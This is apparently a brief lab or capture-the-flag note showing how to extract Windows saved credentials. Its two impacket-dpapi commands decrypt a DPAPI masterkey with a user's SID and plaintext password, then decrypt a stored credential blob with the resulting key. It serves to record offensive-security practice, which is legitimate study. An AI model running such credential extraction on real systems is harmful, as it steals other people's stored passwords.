download blob and masterkey
![](Attachments/Pasted%20image%2020260908124103.png)
```shell
# extract key from masterkey
impacket-dpapi masterkey -file f53fcaba-f057-48e8-8f92-0180d274bf0f -sid S-1-5-21-4220238332-57023728-1129110646-1602 -password RiverDragon#Storm25

# extract password using key
impacket-dpapi credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```
![](Attachments/Pasted%20image%2020260908124621.png)